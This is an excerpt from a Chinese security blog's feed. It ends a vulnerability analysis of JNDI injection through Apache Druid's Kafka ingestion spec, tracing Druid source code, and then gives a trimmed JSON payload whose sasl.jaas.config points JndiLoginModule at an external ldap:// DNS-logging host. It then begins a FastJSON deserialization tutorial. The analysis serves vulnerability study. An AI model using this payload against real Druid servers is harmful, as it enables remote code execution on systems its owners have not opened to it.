ioConfig).getConfigOverrides());<br>    &#125;<br>    <span class="hljs-keyword">finally</span> &#123;<br>      Thread.currentThread().setContextClassLoader(currCtxCl);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/image/kafkadruidimage-6.png" alt="img"></p><p>org.apache.druid.indexing.kafka.supervisor.KafkaSupervisorSpec</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@JsonCreator</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaSupervisorSpec</span><span class="hljs-params">(</span><br><span class="hljs-params">    <span class="hljs-meta">@JsonProperty(&quot;spec&quot;)</span> <span class="hljs-meta">@Nullable</span> KafkaSupervisorIngestionSpec ingestionSchema,</span><br><span class="hljs-params">    <span class="hljs-meta">@JsonProperty(&quot;dataSchema&quot;)</span> <span class="hljs-meta">@Nullable</span> DataSchema dataSchema,</span><br><span class="hljs-params">    <span class="hljs-meta">@JsonProperty(&quot;tuningConfig&quot;)</span> <span class="hljs-meta">@Nullable</span> KafkaSupervisorTuningConfig tuningConfig,</span><br><span class="hljs-params">    //spec json中ioConfig为KafkaSupervisorIOConfig ioConfig</span><br><span class="hljs-params">    <span class="hljs-meta">@JsonProperty(&quot;ioConfig为&quot;)</span> <span class="hljs-meta">@Nullable</span> KafkaSupervisorIOConfig ioConfig,</span><br><span class="hljs-params">    <span class="hljs-meta">@JsonProperty(&quot;context&quot;)</span> Map&lt;String, Object&gt; context,</span><br><span class="hljs-params">    <span class="hljs-meta">@JsonProperty(&quot;suspended&quot;)</span> Boolean suspended,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> TaskStorage taskStorage,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> TaskMaster taskMaster,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> IndexerMetadataStorageCoordinator indexerMetadataStorageCoordinator,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> KafkaIndexTaskClientFactory kafkaIndexTaskClientFactory,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> <span class="hljs-meta">@Json</span> ObjectMapper mapper,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> ServiceEmitter emitter,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> DruidMonitorSchedulerConfig monitorSchedulerConfig,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> RowIngestionMetersFactory rowIngestionMetersFactory,</span><br><span class="hljs-params">    <span class="hljs-meta">@JacksonInject</span> SupervisorStateManagerConfig supervisorStateManagerConfig</span><br><span class="hljs-params">)</span><br>&#123;<br>  <span class="hljs-built_in">super</span>(<br>      ingestionSchema != <span class="hljs-literal">null</span><br>      ? ingestionSchema<br>      : <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaSupervisorIngestionSpec</span>(<br>          dataSchema,<br>          ioConfig,<br>          tuningConfig != <span class="hljs-literal">null</span><br>          ? tuningConfig<br>          : KafkaSupervisorTuningConfig.defaultConfig()<br>      ),<br>      context,<br>      suspended,<br>      taskStorage,<br>      taskMaster,<br>      indexerMetadataStorageCoordinator,<br>      kafkaIndexTaskClientFactory,<br>      mapper,<br>      emitter,<br>      monitorSchedulerConfig,<br>      rowIngestionMetersFactory,<br>      supervisorStateManagerConfig<br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>org.apache.druid.indexing.kafka.supervisor.KafkaSupervisorIOConfig</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@JsonCreator</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaSupervisorIOConfig</span><span class="hljs-params">(</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;topic&quot;)</span> String topic,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;inputFormat&quot;)</span> InputFormat inputFormat,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;replicas&quot;)</span> Integer replicas,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;taskCount&quot;)</span> Integer taskCount,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;taskDuration&quot;)</span> Period taskDuration,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;consumerProperties&quot;)</span> Map&lt;String, Object&gt; consumerProperties,</span><br><span class="hljs-params">  <span class="hljs-meta">@Nullable</span> <span class="hljs-meta">@JsonProperty(&quot;autoScalerConfig&quot;)</span> AutoScalerConfig autoScalerConfig,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;pollTimeout&quot;)</span> Long pollTimeout,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;startDelay&quot;)</span> Period startDelay,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;period&quot;)</span> Period period,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;useEarliestOffset&quot;)</span> Boolean useEarliestOffset,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;completionTimeout&quot;)</span> Period completionTimeout,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;lateMessageRejectionPeriod&quot;)</span> Period lateMessageRejectionPeriod,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;earlyMessageRejectionPeriod&quot;)</span> Period earlyMessageRejectionPeriod,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;lateMessageRejectionStartDateTime&quot;)</span> DateTime lateMessageRejectionStartDateTime,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;configOverrides&quot;)</span> KafkaConfigOverrides configOverrides,</span><br><span class="hljs-params">  <span class="hljs-meta">@JsonProperty(&quot;idleConfig&quot;)</span> IdleConfig idleConfig</span><br><span class="hljs-params">)</span><br>&#123;<br><span class="hljs-built_in">super</span>(<br>    <span class="hljs-comment">//topic不为空</span><br>    Preconditions.checkNotNull(topic, <span class="hljs-string">&quot;topic&quot;</span>),<br>    inputFormat,<br>    replicas,<br>    taskCount,<br>    taskDuration,<br>    startDelay,<br>    period,<br>    useEarliestOffset,<br>    completionTimeout,<br>    lateMessageRejectionPeriod,<br>    earlyMessageRejectionPeriod,<br>    autoScalerConfig,<br>    lateMessageRejectionStartDateTime,<br>    idleConfig<br>);<br><br><span class="hljs-built_in">this</span>.consumerProperties = Preconditions.checkNotNull(consumerProperties, <span class="hljs-string">&quot;consumerProperties&quot;</span>);<br>Preconditions.checkNotNull(<br>    consumerProperties.get(BOOTSTRAP_SERVERS_KEY),<br>    StringUtils.format(<span class="hljs-string">&quot;consumerProperties must contain entry for [%s]&quot;</span>, BOOTSTRAP_SERVERS_KEY)<br>);<br><span class="hljs-built_in">this</span>.pollTimeout = pollTimeout != <span class="hljs-literal">null</span> ? pollTimeout : DEFAULT_POLL_TIMEOUT_MILLIS;<br><span class="hljs-built_in">this</span>.configOverrides = configOverrides;<br>&#125;<br></code></pre></td></tr></table></figure><p>org.apache.druid.indexing.kafka.KafkaRecordSupplier</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//构造方法，代码调用至此构造方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">KafkaRecordSupplier</span><span class="hljs-params">(</span><br><span class="hljs-params">  Map&lt;String, Object&gt; consumerProperties,</span><br><span class="hljs-params">  ObjectMapper sortingMapper,</span><br><span class="hljs-params">  KafkaConfigOverrides configOverrides</span><br><span class="hljs-params">)</span><br>&#123;<br><span class="hljs-built_in">this</span>(getKafkaConsumer(sortingMapper, consumerProperties, configOverrides));<br>&#125;<br><br><br><span class="hljs-comment">//构造方法中调用至getKafkaConsumer()</span><br><span class="hljs-comment">//sortingMapper  为KafkaSamplerSpec中objectMapper</span><br><span class="hljs-comment">//consumerProperties  为声明的map props  主要数据均在此map中</span><br><span class="hljs-comment">//configOverrides  为KafkaSamplerSpec  KafkaSupervisorIngestionSpec 中ConfigOverrides</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> KafkaConsumer&lt;<span class="hljs-type">byte</span>[], <span class="hljs-type">byte</span>[]&gt; getKafkaConsumer(<br>  ObjectMapper sortingMapper,<br>  Map&lt;String, Object&gt; consumerProperties,<br>  KafkaConfigOverrides configOverrides<br>)<br>&#123;<br><span class="hljs-keyword">final</span> Map&lt;String, Object&gt; consumerConfigs = KafkaConsumerConfigs.getConsumerProperties();<br><span class="hljs-keyword">final</span> <span class="hljs-type">Properties</span> <span class="hljs-variable">props</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>Map&lt;String, Object&gt; effectiveConsumerProperties;<br><span class="hljs-comment">//    </span><br><span class="hljs-keyword">if</span> (configOverrides != <span class="hljs-literal">null</span>) &#123;<br>  effectiveConsumerProperties = configOverrides.overrideConfigs(consumerProperties);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  effectiveConsumerProperties = consumerProperties;<br>&#125;<br><span class="hljs-comment">//将 effectiveConsumerProperties 中数据添加至 props 中</span><br>addConsumerPropertiesFromConfig(<br>    props,<br>    sortingMapper,<br>    effectiveConsumerProperties<br>);<br>props.putIfAbsent(<span class="hljs-string">&quot;isolation.level&quot;</span>, <span class="hljs-string">&quot;read_committed&quot;</span>);<br>props.putIfAbsent(<span class="hljs-string">&quot;group.id&quot;</span>, StringUtils.format(<span class="hljs-string">&quot;kafka-supervisor-%s&quot;</span>, IdUtils.getRandomId()));<br>props.putAll(consumerConfigs);<br><br><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">currCtxCl</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br><span class="hljs-keyword">try</span> &#123;<br>  Thread.currentThread().setContextClassLoader(KafkaRecordSupplier.class.getClassLoader());<br>  <span class="hljs-type">Deserializer</span> <span class="hljs-variable">keyDeserializerObject</span> <span class="hljs-operator">=</span> getKafkaDeserializer(props, <span class="hljs-string">&quot;key.deserializer&quot;</span>, <span class="hljs-literal">true</span>);<br>  <span class="hljs-type">Deserializer</span> <span class="hljs-variable">valueDeserializerObject</span> <span class="hljs-operator">=</span> getKafkaDeserializer(props, <span class="hljs-string">&quot;value.deserializer&quot;</span>, <span class="hljs-literal">false</span>);<br>  <span class="hljs-comment">//new KafkaConsumer&lt;&gt; props为前端出入数据</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaConsumer</span>&lt;&gt;(props, keyDeserializerObject, valueDeserializerObject);<br>&#125;<br><span class="hljs-keyword">finally</span> &#123;<br>  Thread.currentThread().setContextClassLoader(currCtxCl);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/image/kafkadruidimage-7.png" alt="img"></p><p><img src="/image/kafkadruidimage-8.png" alt="img"></p><p>调用至new KafkaConsumer()</p><p><img src="/image/kafkadruidimage-9.png" alt="img"></p><p>JNDI注入成功（此处DNSLog模拟，真实JNDI注入需可访问JNDI恶意服务器，也需要注意JDK版本现限制）</p><p><img src="/image/kafkadruidimage-10.png" alt="img"></p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>精简后payload</p><p>bootstrap.servers 可为任意值</p><p>sasl.jaas.config  值参考上一篇</p><p>topic  不为空</p><p>dataSchema 不为空</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;kafka&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;spec&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;kafka&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;ioConfig&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;kafka&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;consumerProperties&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;bootstrap.servers&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;6.6.6.6:9092&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;security.protocol&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;SASL_SSL&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;sasl.jaas.config&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.security.auth.module.JndiLoginModule required user.provider.url=\&quot;ldap://lc7g01.dnslog.cn\&quot; useFirstPass=\&quot;true\&quot; serviceName=\&quot;x\&quot; group.provider.url=\&quot;xxx\&quot;;&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;topic&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;any&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;dataSchema&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;dataSource&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;sample&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;timestampSpec&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;column&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;!!!_no_such_column_!!!&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;missingValue&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1970-01-01T00:00:00Z&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;dimensionsSpec&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;granularitySpec&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;rollup&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FastJSON反序列化漏洞解析</title>
    <link href="/2023/04/14/FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/"/>
    <url>/2023/04/14/FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="一、fastjson简介"><a href="#一、fastjson简介" class="headerlink" title="一、fastjson简介"></a>一、fastjson简介</h2><p>fastjson组件是阿里巴巴开发的反序列化与序列化组件，项目地址：<a href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</a></p><p>简单使用方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//序列化</span><br><span class="hljs-type">String</span> <span class="hljs-variable">text</span> <span class="hljs-operator">=</span> JSON.toJSONString(obj); <br><span class="hljs-comment">//反序列化</span><br><span class="hljs-type">VO</span> <span class="hljs-variable">vo</span> <span class="hljs-operator">=</span> JSON.parse(); <span class="hljs-comment">//解析为JSONObject类型或者JSONArray类型</span><br><span class="hljs-type">VO</span> <span class="hljs-variable">vo</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;...&#125;&quot;</span>); <span class="hljs-comment">//JSON文本解析成JSONObject类型</span><br><span class="hljs-type">VO</span> <span class="hljs-variable">vo</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;...&#125;&quot;</span>, VO.class); <span class="hljs-comment">//JSON文本解析成VO.class类</span><br></code></pre></td></tr></table></figure><p>maven地址：<a href="https://mvnrepository.com/artifact/com.alibaba/fastjson">https://mvnrepository.com/artifact/com.alibaba/fastjson</a></p><h3 id="1-简单的序列化与反序列化"><a href="#1-简单的序列化与反序列化" class="headerlink" title="1.简单的序列化与反序列化"></a>1.简单的序列化与反序列化</h3><p>编写一个User类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> fastjson;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用空参构造&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用形参构造&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用getName()&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用setName()&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用getAge()&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用setAge()&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用fastjson组件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-number">12</span>);<br><br><span class="hljs-comment">//序列号</span><br><span class="hljs-type">String</span> <span class="hljs-variable">serializedStr</span> <span class="hljs-operator">=</span> JSON.toJSONString(user);<br>System.out.println(serializedStr);<br><br><span class="hljs-comment">//通过parse方法进行反序列化，返回的是一个JSONObject</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> JSON.parse(serializedStr);<br>System.out.println(<span class="hljs-string">&quot;parse反序列化对象名称:&quot;</span>+obj1.getClass().getName());<br>System.out.println(<span class="hljs-string">&quot;parse反序列化：&quot;</span>+obj1);<br><br><span class="hljs-comment">//通过parseObject,不指定类，返回的是一个JSONObject</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> JSON.parseObject(serializedStr);<br>System.out.println(<span class="hljs-string">&quot;parseObject反序列化对象名称:&quot;</span>+obj2.getClass().getName());<br>System.out.println(<span class="hljs-string">&quot;parseObject反序列化:&quot;</span>+obj2);<br><br><span class="hljs-comment">//通过parseObject,指定类后返回的是一个相应的类对象</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">obj3</span> <span class="hljs-operator">=</span> JSON.parseObject(serializedStr,User.class);<br>System.out.println(<span class="hljs-string">&quot;parseObject反序列化对象名称:&quot;</span>+obj3.getClass().getName());<br>System.out.println(<span class="hljs-string">&quot;parseObject反序列化:&quot;</span>+obj3);<br></code></pre></td></tr></table></figure><p>输出结果如下：</p><p><img src="/image/image-20220128114618360.png" alt="image-20220128114618360"></p><p>返回结果可知：parseObject(“”,class) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法</p><h3 id="2-type"><a href="#2-type" class="headerlink" title="2.@type"></a>2.@type</h3><pre><code class="hljs">JSON.toJSONString存在3个重载方法，使用toJSONString(Object object, SerializerFeature... features)方法</code></pre><p><img src="/image/image-20220128150238092.png" alt="image-20220128150238092"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-number">12</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">serializedStr1</span> <span class="hljs-operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);<br>System.out.println(serializedStr1);<br></code></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">调用形参构造<br>调用getAge()<br>调用getName()<br>&#123;&quot;@type&quot;:&quot;fastjson.User&quot;,&quot;age&quot;:12,&quot;name&quot;:&quot;zhangsan&quot;&#125;<br></code></pre></td></tr></table></figure><p>发现输出中存在”@type”:”fastjson.User”，对其反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-number">12</span>);<br><br><span class="hljs-comment">//序列化</span><br><span class="hljs-type">String</span> <span class="hljs-variable">serializedStr</span> <span class="hljs-operator">=</span> JSON.toJSONString(user);<br>System.out.println(serializedStr);<br><span class="hljs-type">String</span> <span class="hljs-variable">serializedStr1</span> <span class="hljs-operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);<br>System.out.println(serializedStr1);<br><br>System.out.println(JSON.parse(serializedStr).getClass().toString());<br>System.out.println(JSON.parse(serializedStr1).getClass().toString());<br></code></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 